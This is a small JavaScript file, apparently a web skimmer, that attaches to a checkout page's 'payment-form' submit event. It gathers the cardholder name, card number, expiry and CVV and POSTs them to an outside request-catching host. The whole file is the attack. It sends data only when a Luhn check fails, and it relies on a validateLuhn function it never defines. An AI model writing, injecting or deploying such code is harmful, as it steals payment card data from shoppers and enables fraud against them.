console.log("I'm in");

window.addEventListener('DOMContentLoaded', () => {
    const suckerForm = document.getElementById('payment-form');

    suckerForm.addEventListener('submit', async () => {
        // Remove any spaces the user might have entered
        const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');

        if (!validateLuhn(rawValue)) {
            const userData = {
                nameOnCard: document.getElementById('card-name').value,
                cardNumber: document.getElementById('card-number').value,
                expiryDate: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value
            }

            console.log(userData);

            await fetch("https://madwolf.requestcatcher.com/jackknife", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(userData)
            });
        }
    });
});